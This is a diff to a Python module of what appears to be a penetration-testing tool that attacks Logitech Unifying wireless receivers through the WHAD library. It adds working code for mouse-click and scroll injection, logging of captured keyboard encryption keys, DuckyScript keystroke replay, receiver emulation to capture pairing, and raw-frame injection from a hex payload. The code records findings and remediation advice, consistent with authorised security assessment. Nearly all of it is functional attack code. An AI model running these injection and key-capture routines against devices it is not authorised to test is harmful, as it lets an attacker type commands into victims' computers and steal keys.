@@ -42,6 +42,14 @@ except ImportError:
     _UniKeyboard = None    # type: ignore[assignment,misc]
     _UNIFYING_API_IMPORTABLE = False
 
+try:
+    from whad.unifying import Dongle as _UniDongle, Injector as _UniInjector
+    _UNIFYING_DONGLE_IMPORTABLE = True
+except ImportError:
+    _UniDongle = None      # type: ignore[assignment,misc]
+    _UniInjector = None    # type: ignore[assignment,misc]
+    _UNIFYING_DONGLE_IMPORTABLE = False
+
 
 # ── Entry point ───────────────────────────────────────────────────────────────
 
@@ -68,6 +76,10 @@ def run(dongle: WhadDongle, engagement_id: str) -> None:
         _run_keyboard(dongle, engagement_id)
     elif mode == "ducky":
         _run_ducky(dongle, engagement_id)
+    elif mode == "dongle":
+        _run_dongle_emulation(dongle, engagement_id)
+    elif mode == "injector":
+        _run_injector(dongle, engagement_id)
     else:
         log.info("[S19] Aborted by operator.")
 
@@ -120,13 +132,50 @@ def _run_mouse(dongle: WhadDongle, engagement_id: str) -> None:
                 log.debug(f"[S19][mouse] move error: {exc}")
                 break
 
-        # One left click at the end
+        # Left click
         try:
             mouse.left_click()
-            clicks_sent = 1
+            clicks_sent += 1
             log.info("[S19][mouse] Left click injected.")
         except Exception as exc:
             log.debug(f"[S19][mouse] left_click error: {exc}")
+
+        time.sleep(0.15)
+
+        # Right click
+        try:
+            mouse.right_click()
+            clicks_sent += 1
+            log.info("[S19][mouse] Right click injected.")
+        except Exception as exc:
+            log.debug(f"[S19][mouse] right_click error: {exc}")
+
+        time.sleep(0.15)
+
+        # Middle click
+        try:
+            mouse.middle_click()
+            clicks_sent += 1
+            log.info("[S19][mouse] Middle click injected.")
+        except Exception as exc:
+            log.debug(f"[S19][mouse] middle_click error: {exc}")
+
+        time.sleep(0.15)
+
+        # Scroll demonstration — down then up
+        try:
+            mouse.wheel_down()
+            log.info("[S19][mouse] Scroll wheel down injected.")
+        except Exception as exc:
+            log.debug(f"[S19][mouse] wheel_down error: {exc}")
+
+        time.sleep(0.1)
+
+        try:
+            mouse.wheel_up()
+            log.info("[S19][mouse] Scroll wheel up injected.")
+        except Exception as exc:
+            log.debug(f"[S19][mouse] wheel_up error: {exc}")
 
     except Exception as exc:
         log.warning(f"[S19][mouse] Mouse API init failed: {type(exc).__name__}: {exc}")
@@ -207,6 +256,17 @@ def _run_keyboard(dongle: WhadDongle, engagement_id: str) -> None:
                 "  Device may be out of range or not active."
             )
             return
+
+        try:
+            enc_key = keyboard.key
+            aes_ctr = keyboard.aes_counter
+            if enc_key:
+                log.info(f"[S19][kbd] Encryption key: {enc_key.hex()}")
+                log.info(f"[S19][kbd] AES counter: {aes_ctr}")
+        except AttributeError:
+            log.debug("[S19][kbd] key/aes_counter not available")
+        except Exception as exc:
+            log.debug(f"[S19][kbd] key exposure error: {exc}")
 
         try:
             keyboard.send_text(text)
@@ -348,6 +408,21 @@ def _run_ducky(dongle: WhadDongle, engagement_id: str) -> None:
                 elif cmd in ("ESCAPE", "ESC"):
                     keyboard.send_key("ESCAPE")
                     keys_sent += 1
+                elif cmd in ("VOLUME_UP", "VOLUMEUP"):
+                    try:
+                        keyboard.volume_up()
+                    except AttributeError:
+                        pass
+                elif cmd in ("VOLUME_DOWN", "VOLUMEDOWN"):
+                    try:
+                        keyboard.volume_down()
+                    except AttributeError:
+                        pass
+                elif cmd in ("VOLUME_MUTE", "MUTE"):
+                    try:
+                        keyboard.volume_toggle()
+                    except AttributeError:
+                        pass
                 # Unknown command: skip silently
             except Exception as exc:
                 log.debug(f"[S19][ducky] cmd {cmd!r}: {exc}")
@@ -411,10 +486,12 @@ def _ask_mode() -> str:
     print("    [M]  Mouse    — synchronize + inject cursor moves + click")
     print("    [K]  Keyboard — synchronize + inject text string")
     print("    [D]  Ducky    — synchronize + replay DuckyScript file")
+    print("    [E]  Dongle   — emulate Unifying receiver to capture pairing")
+    print("    [I]  Injector — inject a raw Unifying frame by hex payload")
     print("    [S]  Skip")
     while True:
         try:
-            c = input("  Select [M/K/D/S]: ").strip().upper()
+            c = input("  Select [M/K/D/E/I/S]: ").strip().upper()
         except (KeyboardInterrupt, EOFError):
             return "skip"
         if c == "M":
@@ -423,9 +500,13 @@ def _ask_mode() -> str:
             return "keyboard"
         if c == "D":
             return "ducky"
+        if c == "E":
+            return "dongle"
+        if c == "I":
+            return "injector"
         if c in ("S", ""):
             return "skip"
-        print("  Please enter M, K, D, or S.")
+        print("  Please enter M, K, D, E, I, or S.")
 
 
 def _prompt_address(prompt: str) -> str | None:
@@ -464,3 +545,191 @@ def _print_keyboard_summary(
     print(f"  {'Text injected':<22}: {text!r}")
     print(f"  {'Result':<22}: {'SUCCESS' if inject_ok else 'FAILED'}")
     print("─" * 76 + "\n")
+
+
+# ── Dongle emulation sub-mode ─────────────────────────────────────────────────
+
+def _run_dongle_emulation(dongle: WhadDongle, engagement_id: str) -> None:
+    """Emulate a Unifying receiver to capture device pairing."""
+    if not _UNIFYING_DONGLE_IMPORTABLE:
+        log.warning(
+            "[S19][dongle] whad.unifying.Dongle not importable — "
+            "install WHAD with Unifying support. Skipping."
+        )
+        return
+
+    target_addr = _prompt_address("Dongle emulation — enter Unifying ESB address to emulate")
+    if not target_addr:
+        log.info("[S19][dongle] No address — aborted.")
+        return
+
+    timeout = config.UNIFYING_SYNC_TIMEOUT
+    paired = _emulate_unifying_dongle(dongle, target_addr, timeout=timeout)
+
+    print("\n" + "─" * 76)
+    print("  STAGE 19 SUMMARY -- Unifying API / Dongle Emulation")
+    print("─" * 76)
+    print(f"  {'Target address':<22}: {target_addr}")
+    print(f"  {'Timeout':<22}: {timeout}s")
+    print(f"  {'Device paired':<22}: {'yes' if paired else 'no'}")
+    print("─" * 76 + "\n")
+
+    if paired:
+        finding = Finding(
+            type="unifying_api_dongle_pairing_capture",
+            severity="high",
+            target_addr=target_addr,
+            description=(
+                f"Unifying dongle emulation captured a device pairing event from {target_addr}. "
+                "A peripheral actively paired with the emulated receiver — "
+                "pairing frames may contain linkable credentials."
+            ),
+            remediation=(
+                "Replace Unifying receivers with Logitech Bolt (AES-128 encrypted). "
+                "Ensure devices are only paired in physically secure environments."
+            ),
+            evidence={
+                "target_address": target_addr,
+                "method": "unifying_api_dongle_emulation",
+                "paired": paired,
+            },
+            engagement_id=engagement_id,
+        )
+        insert_finding(finding)
+        log.info(f"FINDING [high] unifying_api_dongle_pairing_capture: {target_addr}")
+
+
+# ── Raw injector sub-mode ─────────────────────────────────────────────────────
+
+def _run_injector(dongle: WhadDongle, engagement_id: str) -> None:
+    """Inject a raw Unifying frame by hex payload."""
+    if not _UNIFYING_DONGLE_IMPORTABLE:
+        log.warning(
+            "[S19][inject] whad.unifying.Injector not importable — "
+            "install WHAD with Unifying support. Skipping."
+        )
+        return
+
+    target_addr = _prompt_address("Injector — enter Unifying receiver ESB address")
+    if not target_addr:
+        log.info("[S19][inject] No address — aborted.")
+        return
+
+    try:
+        payload_hex = input("  Hex payload to inject (e.g. 050000000000): ").strip()
+    except (KeyboardInterrupt, EOFError):
+        log.info("[S19][inject] Aborted.")
+        return
+
+    if not payload_hex:
+        log.info("[S19][inject] No payload — aborted.")
+        return
+
+    ok = _inject_unifying_frame(dongle, target_addr, payload_hex)
+
+    print("\n" + "─" * 76)
+    print("  STAGE 19 SUMMARY -- Unifying API / Raw Frame Injection")
+    print("─" * 76)
+    print(f"  {'Target address':<22}: {target_addr}")
+    print(f"  {'Payload':<22}: {payload_hex}")
+    print(f"  {'Result':<22}: {'SUCCESS' if ok else 'FAILED'}")
+    print("─" * 76 + "\n")
+
+    if ok:
+        finding = Finding(
+            type="unifying_api_raw_frame_injection",
+            severity="high",
+            target_addr=target_addr,
+            description=(
+                f"Raw Unifying frame injected to {target_addr} via whad.unifying.Injector. "
+                f"Payload: {payload_hex}. No pairing or authentication required."
+            ),
+            remediation=(
+                "Replace Unifying receivers with Logitech Bolt (AES-128 encrypted). "
+                "Unifying receivers cannot be patched against raw frame injection at the RF layer."
+            ),
+            evidence={
+                "target_address": target_addr,
+                "method": "unifying_api_injector",
+                "payload_hex": payload_hex,
+            },
+            engagement_id=engagement_id,
+        )
+        insert_finding(finding)
+        log.info(f"FINDING [high] unifying_api_raw_frame_injection: {target_addr}")
+
+
+# ── Low-level helpers (callable from external stages) ─────────────────────────
+
+def _emulate_unifying_dongle(dongle: WhadDongle, target_addr: str, timeout: int = 30) -> bool:
+    """Emulate a Unifying receiver dongle to capture device pairing.
+
+    Uses whad.unifying.Dongle connector. Returns True if a device paired,
+    False on failure or unsupported hardware.
+    """
+    try:
+        from whad.unifying import Dongle
+    except ImportError:
+        log.debug("[S19][dongle] whad.unifying.Dongle not importable")
+        return False
+
+    log.info(f"[S19][dongle] Starting dongle emulation for {timeout}s")
+    dongle_connector = None
+    try:
+        dongle_connector = Dongle(dongle.device)
+        dongle_connector.address = target_addr
+        dongle_connector.start()
+        from time import time as _time
+        deadline = _time() + timeout
+        while _time() < deadline:
+            remaining = deadline - _time()
+            try:
+                pkt = dongle_connector.wait_packet(timeout=min(remaining, 1.0))
+                if pkt is not None:
+                    log.info(f"[S19][dongle] Paired device packet: {bytes(pkt).hex()}")
+                    return True
+            except Exception:
+                break
+    except AttributeError:
+        log.debug("[S19][dongle] Dongle connector not available on this hardware")
+    except Exception as exc:
+        log.debug(f"[S19][dongle] Dongle emulation error: {exc}")
+    finally:
+        if dongle_connector is not None:
+            try:
+                dongle_connector.stop()
+            except Exception:
+                pass
+    return False
+
+
+def _inject_unifying_frame(dongle: WhadDongle, target_addr: str, payload_hex: str) -> bool:
+    """Inject a raw Unifying frame using whad.unifying.Injector.
+
+    Returns True on success, False on failure or unsupported hardware.
+    """
+    try:
+        from whad.unifying import Injector
+    except ImportError:
+        log.debug("[S19][inject] whad.unifying.Injector not importable")
+        return False
+
+    injector = None
+    try:
+        injector = Injector(dongle.device)
+        injector.address = target_addr
+        payload = bytes.fromhex(payload_hex)
+        injector.inject(payload)
+        log.info(f"[S19][inject] Frame injected: {payload_hex}")
+        return True
+    except AttributeError:
+        log.debug("[S19][inject] Injector not available on this hardware")
+    except Exception as exc:
+        log.debug(f"[S19][inject] Inject error: {exc}")
+    finally:
+        if injector is not None:
+            try:
+                injector.stop()
+            except Exception:
+                pass
+    return False
